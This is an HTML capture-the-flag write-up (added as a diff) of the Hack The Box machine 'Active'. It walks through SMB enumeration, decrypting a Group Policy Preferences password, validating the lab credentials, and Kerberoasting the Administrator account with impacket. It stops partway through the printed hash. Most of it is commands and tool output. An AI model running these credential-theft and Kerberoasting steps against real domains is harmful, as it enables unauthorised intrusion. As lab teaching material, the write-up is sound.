@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>document.documentElement.classList.add("js");(function(){function a(k){var o=[];try{var p=String(window.name||"").split(";");for(var i=0;i<p.length;i++){var q=p[i].split("=");if(q[0]===k&&q[1])o.push(q[1])}}catch(e){}try{var m=document.cookie.match(new RegExp("(?:^|; )"+k+"=([^;]*)"));if(m)o.push(decodeURIComponent(m[1]))}catch(e){}try{var v=localStorage.getItem(k);if(v!==null&&typeof v!=="undefined")o.push(v)}catch(e){}return o}function g(k){var v=a(k);return v.length?v[0]:null}function p(){var b=null;a("fg-prefs").forEach(function(r){var x=String(r).split(".");if(x.length!==3)return;var t=parseInt(x[0],36);if(!isFinite(t)||t<=0)return;var th=x[1]==="light"||x[1]==="dark"?x[1]:null;var rl=x[2]==="c"||x[2]==="o"?x[2]:null;if(th||rl){if(!b||t>b.t)b={t:t,th:th,rl:rl}}});if(b)return b;var th=g("fg-theme"),rl=g("fg-spine-v2");if(th==="light"||th==="dark"||rl==="c"||rl==="o")return{t:0,th:th==="light"||th==="dark"?th:null,rl:rl==="c"||rl==="o"?rl:null};return null}try{var s=p();var th=s&&s.th?s.th:(matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");document.documentElement.setAttribute("data-theme",th);if(s&&s.rl==="c")document.documentElement.classList.add("nav-collapsed")}catch(e){document.documentElement.setAttribute("data-theme","dark")}})();</script>
+    <link rel="icon" type="image/svg+xml" href="../favicon.svg">
+    <link rel="alternate icon" type="image/x-icon" href="../assets/images/favicon.ico">
+    <link rel="stylesheet" href="../assets/css/reset.css?v=8">
+    <link rel="stylesheet" href="../assets/css/site.css?v=176">
+    <title>Frédéric Goossens | Active</title>
+</head>
+<body>
+    <a class="skip" href="#main">Skip to content</a>
+
+    <header class="spine">
+        <div class="spine-id">
+            <a class="si-id" href="../index.html" aria-label="Frédéric Goossens - Home">
+                <span class="si-photo"><img src="../assets/images/pfp.jpg" alt="Frédéric Goossens"></span>
+                <span class="si-prompt"><span class="sigil">$</span>whoami</span>
+                <span class="si-name">Frédéric Goossens</span>
+                <span class="si-roles"><span>Pentester</span><span>OSCP · BSCP</span></span>
+            </a>
+            <div class="si-socials">
+                <a class="slink" href="https://github.com/fredericgoossens" target="_blank" rel="noopener noreferrer" aria-label="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg></a>
+                <a class="slink" href="https://www.linkedin.com/in/fr%C3%A9d%C3%A9ric-goossens-0344b1241/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></a>
+            </div>
+        </div>
+        <nav aria-label="Primary">
+            <ul>
+                <li><a href="../index.html"><span class="n">01</span><span class="l">Home</span></a></li>
+                <li><a href="../resume.html"><span class="n">02</span><span class="l">Resume</span></a></li>
+                <li><a href="../writing.html"><span class="n">03</span><span class="l">Writing</span></a></li>
+                <li><a href="../htb.html"><span class="n">04</span><span class="l">HackTheBox</span></a></li>
+            </ul>
+        </nav>
+        <div class="spine-foot">
+            <button class="theme-btn" type="button" data-theme-toggle aria-label="Toggle color theme" aria-pressed="false"><svg class="i-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg><svg class="i-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"/></svg></button>
+            <button class="spine-toggle" type="button" data-spine-toggle aria-expanded="true" aria-label="Collapse navigation"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M15 18l-6-6 6-6"/></svg></button>
+        </div>
+    </header>
+
+    <div class="topbar">
+        <a class="topbar-id" href="../index.html" aria-label="Frédéric Goossens - Home"><img src="../assets/images/pfp.jpg" alt="Frédéric Goossens"></a>
+        <div class="tb-actions">
+            <button class="theme-btn" type="button" data-theme-toggle aria-label="Toggle color theme" aria-pressed="false"><svg class="i-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg><svg class="i-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"/></svg></button>
+            <button class="menu-btn" type="button" data-menu-open aria-label="Open menu" aria-controls="menu" aria-haspopup="dialog" aria-expanded="false">
+                <span></span><span></span><span></span>
+            </button>
+        </div>
+    </div>
+
+    <div id="menu" role="dialog" aria-modal="true" aria-label="Navigation menu" aria-hidden="true" inert>
+        <div class="menu-top">
+            <a class="mi-id" href="../index.html" aria-label="Frédéric Goossens - Home"><img src="../assets/images/pfp.jpg" alt=""><span>Frédéric Goossens</span></a>
+            <button class="close-btn" type="button" data-menu-close>Close ×</button>
+        </div>
+        <nav aria-label="Mobile">
+            <ul>
+                <li><a href="../index.html"><span class="n">01</span>Home</a></li>
+                <li><a href="../resume.html"><span class="n">02</span>Resume</a></li>
+                <li><a href="../writing.html"><span class="n">03</span>Writing</a></li>
+                <li><a href="../htb.html"><span class="n">04</span>HackTheBox</a></li>
+            </ul>
+        </nav>
+        <div class="menu-foot">
+            <a class="slink" href="https://github.com/fredericgoossens" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg><span>GitHub</span></a>
+            <a class="slink" href="https://www.linkedin.com/in/fr%C3%A9d%C3%A9ric-goossens-0344b1241/" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg><span>LinkedIn</span></a>
+        </div>
+    </div>
+
+    <div class="progress"></div>
+
+    <div class="shell">
+        <main class="wrap" id="main">
+            <div class="post-wrap">
+                <article class="post" data-cover="../assets/images/htb/active/logo.png">
+                    <a class="crumb" href="../htbList.html?os=Windows">← All Windows write-ups</a>
+                    <h1 data-type="Active" data-prefix="# "></h1>
+
+                    <div class="info">
+                        <div class="meta-item">
+                            <span class="meta-k">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3l7 3v5c0 4.6-3 8.2-7 10-4-1.8-7-5.4-7-10V6l7-3z"/></svg>
+                                Platform
+                            </span>
+                            <span class="meta-v">Hack The Box</span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-k">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" aria-hidden="true"><path d="M5 20v-4M11 20V10M17 20V4"/></svg>
+                                Difficulty
+                            </span>
+                            <span class="meta-v" data-diff="Easy">Easy</span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-k">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg>
+                                Read time
+                            </span>
+                            <span class="meta-v" data-read-time-auto=""></span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-k">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" aria-hidden="true"><path d="M4 20l4-1L20 7l-3-3L5 16l-1 4z"/></svg>
+                                Author
+                            </span>
+                            <span class="meta-v">Frédéric Goossens</span>
+                        </div>
+                    </div>
+
+                    <h2>Discovery</h2>
+
+<details>
+<summary>NMAP</summary>
+<div class="inner">
+<pre><code>PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid:
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-08-14 20:54:50Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         Microsoft Windows RPC
+49165/tcp open  msrpc         Microsoft Windows RPC
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.93%E=4%D=8/14%OT=53%CT=1%CU=42653%PV=Y%DS=2%DC=T%G=Y%TM=64DA94E
+OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS=
+OS:7)OPS(O1=M53CNW8ST11%O2=M53CNW8ST11%O3=M53CNW8NNT11%O4=M53CNW8ST11%O5=M5
+OS:3CNW8ST11%O6=M53CST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=200
+OS:0)ECN(R=Y%DF=Y%T=80%W=2000%O=M53CNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S
+OS:+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%
+OS:T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=
+OS:0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%
+OS:S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
+OS:R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
+OS:N%T=80%CD=Z)
+
+Uptime guess: 0.927 days (since Sun Aug 13 18:41:26 2023)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=257 (Good luck!)
+IP ID Sequence Generation: Incremental
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time:
+|   date: 2023-08-14T20:55:59
+|_  start_date: 2023-08-13T22:41:52
+| smb2-security-mode:
+|   210:
+|_    Message signing enabled and required
+
+TRACEROUTE (using port 21/tcp)
+HOP RTT      ADDRESS
+1   98.54 ms 10.10.14.1
+2   98.85 ms 10.10.10.100</code></pre>
+</div>
+</details>
+
+<h2>Enumeration</h2>
+
+<details>
+<summary>Nessus</summary>
+<div class="inner">
+<p>DNS RCE: Microsoft DNS Server Remote Code Execution (SIGRed)<br>CVE-2020-1350</p><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-1350">https://nvd.nist.gov/vuln/detail/CVE-2020-1350</a></p><p>&amp; Readable SMB Share</p>
+</div>
+</details>
+
+<details>
+<summary>SMB share</summary>
+<div class="inner">
+<p><code>smbmap -H 10.10.10.100</code></p><pre><code>ADMIN$                        NO ACCESS       Remote Admin
+C$                            NO ACCESS       Default share
+IPC$                          NO ACCESS       Remote IPC
+NETLOGON                      NO ACCESS       Logon server share
+Replication                   READ ONLY
+SYSVOL                        NO ACCESS       Logon server share
+Users                         NO ACCESS</code></pre><p>→ Using explorer in kali smb:\\10.10.10.100\Replication                   </p>
+</div>
+</details>
+
+<h2>SMB Share</h2>
+
+<ul><li>Found a folder active.htb</li><li>There is a folder called policies with some objects in</li><li>one xml file seems to have some interesting information:<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"&gt;&lt;User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"&gt;&lt;Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/&gt;&lt;/User&gt;
+&lt;/Groups&gt;</code></pre></li><li>encrypted pw: <code>edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</code></li><li>user: active.htb\SVC_TGS</li></ul>
+
+<h3>Decrypt password</h3>
+
+<figure class="bookmark"><p><a href="https://systemweakness.com/find-and-decrypt-gpp-password-4edb9a1663c4" target="_blank" rel="noopener noreferrer">Find and Decrypt GPP Password</a></p></figure>
+
+<aside class="block-color-gray_background callout" data-notion-callout="" data-notion-callout-icon="ℹ️" data-notion-callout-background="gray_background" style="white-space:pre-wrap;display:flex" id="287d769a-f744-4b16-98df-c90542442393" dir="ltr"><div style="font-size:1.5em"><span class="icon" data-emoji="ℹ️"></span></div><div style="width:100%">This file is usually located in a directory of the SMB shared resources, called <strong>SYSVOL</strong>, if you find this directory and you have read permissions on it, take advantage of it, and look for the file called <strong>groups.xml.</strong></div></aside>
+
+<aside class="block-color-gray_background callout" data-notion-callout="" data-notion-callout-icon="ℹ️" data-notion-callout-background="gray_background" style="white-space:pre-wrap;display:flex" id="df12bb49-c5c6-49dc-b83f-4da2b3c39282" dir="ltr"><div style="font-size:1.5em"><span class="icon" data-emoji="ℹ️"></span></div><div style="width:100%">When we have this hash, thanks to the fact that some time ago by mistake Microsoft published the AES key to decrypt this password, here more information, there is a tool called gpp-decrypt, preinstalled in Kali Linux</div></aside>
+
+<aside class="block-color-gray_background callout" data-notion-callout="" data-notion-callout-icon="📦" data-notion-callout-background="gray_background" style="white-space:pre-wrap;display:flex" id="f34b2b80-f6fb-4c5b-a9ce-2cb265ae31d2" dir="ltr"><div style="font-size:1.5em"><span class="icon" data-emoji="📦"></span></div><div style="width:100%">Interesting msf module to do this automatically: scanner/smb/smb_enum_gpp</div></aside>
+
+<p>Decrypt using gpp-decrypt:</p>
+
+<pre><code>┌──(kali㉿kali)-[~/SIGRed_RCE_PoC]
+└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+GPPstillStandingStrong2k18</code></pre>
+
+<p>→ <strong>active.htb\SVC_TGS</strong>:<mark class="highlight-red" data-notion-highlight="red">GPPstillStandingStrong2k18</mark></p>
+
+<h3>Getting access</h3>
+
+<ol><li>Crackmapexec scan<pre><code>┌──(kali㉿kali)-[~/SIGRed_RCE_PoC]
+└─$ crackmapexec smb 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18 -d active.htb
+SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
+SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18</code></pre></li><li>Check smb permissions
+
+<p><code>smbmap -H 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18 -d active.htb   </code></p>
+
+<pre><code>ADMIN$                  NO ACCESS       Remote Admin
+C$                      NO ACCESS       Default share
+IPC$                    NO ACCESS       Remote IPC
+NETLOGON                READ ONLY       Logon server share
+Replication             READ ONLY
+SYSVOL                  READ ONLY       Logon server share
+Users                   READ ONLY</code></pre>
+
+<ul><li>psexec won’t work, because there are no writable shares</li><li>however there are more shares we can read right now</li><li>Flag in SVC_TGS/Desktop/users.txt → <strong><mark class="highlight-teal" data-notion-highlight="teal">794a4acdef9e7d556c8d16642166d4b5</mark></strong></li></ul>
+
+</li><li>Enumerating users &amp; groups</li></ol>
+
+<details>
+<summary>smb (metasploit)</summary>
+<div class="inner">
+<pre><code>msfconsole
+use scanner/smb/smb_enumusers
+[+] 10.10.10.100:445 - ACTIVE [ Administrator, Guest, krbtgt, SVC_TGS ] ( LockoutTries=0 PasswordMin=7 </code></pre>
+</div>
+</details>
+
+<details>
+<summary>enum4linux</summary>
+<div class="inner">
+<p><code>enum4linux -u SVC_TGS -p GPPstillStandingStrong2k18 -w active.htb -a 10.10.10.100</code></p><details><summary>Users</summary><div class="inner"><pre><code>user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[SVC_TGS] rid:[0x44f]</code></pre>
+</div>
+</details><details>
+<summary>Groups</summary>
+<div class="inner">
+<pre><code>[+] Getting builtin groups:
+
+group:[Server Operators] rid:[0x225]
+group:[Account Operators] rid:[0x224]
+group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
+group:[Incoming Forest Trust Builders] rid:[0x22d]
+group:[Windows Authorization Access Group] rid:[0x230]
+group:[Terminal Server License Servers] rid:[0x231]
+group:[Administrators] rid:[0x220]
+group:[Users] rid:[0x221]
+group:[Guests] rid:[0x222]
+group:[Print Operators] rid:[0x226]
+group:[Backup Operators] rid:[0x227]
+group:[Replicator] rid:[0x228]
+group:[Remote Desktop Users] rid:[0x22b]
+group:[Network Configuration Operators] rid:[0x22c]
+group:[Performance Monitor Users] rid:[0x22e]
+group:[Performance Log Users] rid:[0x22f]
+group:[Distributed COM Users] rid:[0x232]
+group:[IIS_IUSRS] rid:[0x238]
+group:[Cryptographic Operators] rid:[0x239]
+group:[Event Log Readers] rid:[0x23d]
+group:[Certificate Service DCOM Access] rid:[0x23e]
+
+[+]  Getting builtin group memberships:
+
+Group: Administrators' (RID: 544) has member: ACTIVE\Administrator
+Group: Administrators' (RID: 544) has member: ACTIVE\Enterprise Admins
+Group: Administrators' (RID: 544) has member: ACTIVE\Domain Admins
+Group: Windows Authorization Access Group' (RID: 560) has member: NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS
+Group: IIS_IUSRS' (RID: 568) has member: NT AUTHORITY\IUSR
+Group: Guests' (RID: 546) has member: ACTIVE\Guest
+Group: Guests' (RID: 546) has member: ACTIVE\Domain Guests
+Group: Pre-Windows 2000 Compatible Access' (RID: 554) has member: NT AUTHORITY\Authenticated Users
+Group: Users' (RID: 545) has member: NT AUTHORITY\INTERACTIVE
+Group: Users' (RID: 545) has member: NT AUTHORITY\Authenticated Users
+Group: Users' (RID: 545) has member: ACTIVE\Domain Users
+
+[+]  Getting local groups:
+
+group:[Cert Publishers] rid:[0x205]
+group:[RAS and IAS Servers] rid:[0x229]
+group:[Allowed RODC Password Replication Group] rid:[0x23b]
+group:[Denied RODC Password Replication Group] rid:[0x23c]
+group:[DnsAdmins] rid:[0x44d]
+
+[+]  Getting local group memberships:
+
+Group: Denied RODC Password Replication Group' (RID: 572) has member: ACTIVE\krbtgt
+Group: Denied RODC Password Replication Group' (RID: 572) has member: ACTIVE\Domain Controllers
+Group: Denied RODC Password Replication Group' (RID: 572) has member: ACTIVE\Schema Admins
+Group: Denied RODC Password Replication Group' (RID: 572) has member: ACTIVE\Enterprise Admins
+Group: Denied RODC Password Replication Group' (RID: 572) has member: ACTIVE\Cert Publishers
+Group: Denied RODC Password Replication Group' (RID: 572) has member: ACTIVE\Domain Admins
+Group: Denied RODC Password Replication Group' (RID: 572) has member: ACTIVE\Group Policy Creator Owners
+Group: Denied RODC Password Replication Group' (RID: 572) has member: ACTIVE\Read-only Domain Controllers
+
+[+]  Getting domain groups:
+
+group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
+group:[Domain Admins] rid:[0x200]
+group:[Domain Users] rid:[0x201]
+group:[Domain Guests] rid:[0x202]
+group:[Domain Computers] rid:[0x203]
+group:[Domain Controllers] rid:[0x204]
+group:[Schema Admins] rid:[0x206]
+group:[Enterprise Admins] rid:[0x207]
+group:[Group Policy Creator Owners] rid:[0x208]
+group:[Read-only Domain Controllers] rid:[0x209]
+group:[DnsUpdateProxy] rid:[0x44e]
+
+[+]  Getting domain group memberships:
+
+Group: 'Domain Admins' (RID: 512) has member: ACTIVE\Administrator
+Group: 'Domain Controllers' (RID: 516) has member: ACTIVE\DC$
+Group: 'Schema Admins' (RID: 518) has member: ACTIVE\Administrator
+Group: 'Domain Guests' (RID: 514) has member: ACTIVE\Guest
+Group: 'Group Policy Creator Owners' (RID: 520) has member: ACTIVE\Administrator
+Group: 'Domain Users' (RID: 513) has member: ACTIVE\Administrator
+Group: 'Domain Users' (RID: 513) has member: ACTIVE\krbtgt
+Group: 'Domain Users' (RID: 513) has member: ACTIVE\SVC_TGS
+Group: 'Enterprise Admins' (RID: 519) has member: ACTIVE\Administrator</code></pre>
+</div>
+</details></div></details>
+
+<details>
+<summary>ADenum (Kerberoastable user!)</summary>
+<div class="inner">
+<p><code>python3 ADenum.py -d 'active.htb' -ip 10.10.10.100 -u'SVC_TGS' -p 'GPPstillStandingStrong2k18' -c</code></p><pre><code>====================================================
+===================== Enum LDAP ====================
+====================================================
+
+
+
+[-] Users who are Domain Admin
+[*] Username: Administrator            CN=Administrator,CN=Users,DC=active,DC=htb
+
+[-] Domain Controllers
+[*] Computer: DC$                      CN=DC,OU=Domain Controllers,DC=active,DC=htb
+    [V] Windows Server 2008 R2 Standard 6.1 (7601)
+
+[-] Users with Password Not Expire
+[*] Username: Administrator            CN=Administrator,CN=Users,DC=active,DC=htb
+[*] Username: Guest                    CN=Guest,CN=Users,DC=active,DC=htb
+[*] Username: SVC_TGS                  CN=SVC_TGS,CN=Users,DC=active,DC=htb
+
+[-] Users with old password
+[!] Username: Administrator            Password last change: 1853 days ago 2018-07-18 19:06:40
+[!] Username: krbtgt                   Password last change: 1853 days ago 2018-07-18 18:50:36
+[!] Username: SVC_TGS                  Password last change: 1852 days ago 2018-07-18 20:14:38
+
+[-] Users with an interesting description
+[!] No entry found !
+
+[-] Users with not the default encryption
+[*] Username: Administrator            Password is in a reversible encryption or in DES !
+
+[-] Protecting Privileged Domain Accounts
+[!] No entry found !
+
+[-] Not Default Attributes (TEST IN BETA)
+
+[!] No entry found !
+
+[-] Laps Password
+[!] No entry found !
+
+
+====================================================
+==================== Attack AD =====================
+====================================================
+
+
+[-] AS-REP Roastable Users
+[!] No entry found !
+[+] [-] Error in searchRequest -&gt; operationsError: 000004DC: LdapErr: DSID-0C09075A, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v1db1\x00
+
+[-] Kerberoastable Users
+[*] Username: Administrator            CN=Administrator,CN=Users,DC=active,DC=htb
+[+] Hash added to file:                kerbHash.hash
+
+[-] Starting to crack hashs
+[!] No entry found !</code></pre><ul><li>Administrator is Kerberoastable!</li></ul>
+</div>
+</details>
+
+<h2>Kerberoasting Administrator</h2>
+
+<ol><li>Using impacket:<pre><code>impacket-GetUserSPNs -dc-ip 10.10.10.100 active.htb/SVC_TGS -request</code></pre><details>
+<summary>kerberos hash outp</summary>
+<div class="inner">
+<pre><code>active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2023-08-13 18:42:53.479742
+
+
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$3027690a487122004a3a650e18942c68$641be54f08a7cd0261ea9df349b0ddecb5d2f3480898deccd8605328e47c65e930443cb3490730cb00e267f3eaddea045c59e2f2f249208ebc49ab05db5687b458f808c5094fe3b5431f032ddc5fdd778da2d02faf93ce9de5c50365f332f4e65d72abc9b1793daf1f492475505e1eeb02575d51ad8c9dad11d53535c9d5b9db579cf71cf6eb65aae39e6ce2019d001af4a53920e8a4951bfe9cf5b352aecb0579c70ac919bc50a7801ec58ebe546e40d4c8d7e36a0187d7bde311c230e34fa920c6177120b1a1bf861c944f97771c80513835560aeab11c9a4bf8f0e5e135c4413f351070c7ef9421bd662c371ffc736bd03905fafd2390752bb1c1f9d952cabfc039748c05d53dac8ce46e87b9239129a9ccb9e8fe164782d6b3cbf4c656d1e648988d9fd11a3880fe335b579a5a04a123c57740d2270f2884ba85a08f3b8ccaa2482d9b60b5b3d3b6f9d5dd9edb7907dee592f15f9596f685d071599a4c1ac59dbd7c238da6595bd9d57d713da8eea9fe6b6ff39d121625e158e0f439ffda525dbde0191c673aff77cde27dfed1f64d568f2fd9d8e21e7abddebca990416a62c64ac4798997a1a034e6adb800ff3f1294292ad9487f8a57a6042245839bbbeb72f29e83a2c4cd9e94a1512388ae72c1c426b02cb07aea4cdd9d9f16622712d294f0e11f319cdce5b751e9568f61e374a88a8e44d28cdfccd88703dcfd50688cf4bbe5c87983cb4e68177bbb92a37b06f7d1014d7c96ef7ee0fe8b19aba1d803da009424a2367379ed07c9e26b07c5562451379212d7cc16b21355db7f08b95e3a35fef454e837d23719a62e53620d3bb9a2ac08f2fc6a1992f29de7e6c439597d289d190c706cc42e325e34bf04709d00f70c5116b19ca2953e6ac9b09bb151f6090a88b66fde6f158fbf3a435b87fac6375fab336950de5d21798f3666a26a10e81ada56a6ad897265d0668c1390dd3148bddd632aa2f6f5df86804d442ae34100558dafd07c87faac46a285987871345da37851aeae5bf131640d7f40e830abfb87e7fc558a0ca7c2ac86d1799385ffafa6130d0b62cc0e040a95f88471099c2366f4a7075578ad5f906a50d3